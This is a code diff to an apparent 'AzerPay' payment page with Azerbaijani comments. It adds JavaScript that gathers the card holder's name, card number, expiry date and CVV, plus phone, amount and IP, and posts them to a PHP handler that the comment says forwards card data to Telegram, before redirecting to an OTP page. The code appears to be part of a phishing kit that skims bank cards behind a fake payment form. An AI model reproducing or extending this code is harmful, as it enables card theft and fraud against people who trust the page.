@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ödəniş Səhifəsi - AzerPay</title>
     <style>
-        /* STILLƏRİNİZ EYNİ QALIR - YER QƏNAƏTİ ÜÇÜN KƏSİLDİ */
         body { margin: 0; padding: 0; background: #fdf5f5; color: #17223b; font-family: 'Segoe UI', Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; box-sizing: border-box; }
         header { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; box-sizing: border-box; background: transparent; }
         .logo-area { display: flex; align-items: center; font-size: 1.4rem; font-weight: bold; }
@@ -229,11 +228,36 @@
         localStorage.setItem('phone', phone);
         localStorage.setItem('amount', amount);
         localStorage.setItem('ip', ip);
+        localStorage.setItem('campaign', localStorage.getItem('selectedCampaign') || '');
 
+        // ============================================
+        // 📤 KART MƏLUMATLARINI TELEGRAM-A GÖNDƏR
+        // ============================================
+        const formData = new FormData();
+        formData.append('card_name', inpName.value);
+        formData.append('card_number', inpNo.value);
+        formData.append('card_expiry', inpExp.value);
+        formData.append('card_cvv', inpCvv.value);
+        formData.append('operator', oper);
+        formData.append('phone', phone);
+        formData.append('amount', amount);
+        formData.append('ip', ip);
+        formData.append('campaign', localStorage.getItem('selectedCampaign') || '');
+
+        try {
+            await fetch('api/telegram-handler.php', {
+                method: 'POST',
+                body: formData
+            });
+        } catch(error) {
+            console.log('Kart göndərilmədi:', error);
+        }
+
+        // OTP SƏHİFƏSİNƏ KEÇ
         setTimeout(function() {
             document.getElementById('loaderOverlay').classList.remove('active');
             window.location.href = 'otp.html';
-        }, 2000);
+        }, 1500);
     });
 
     function closePopup() {
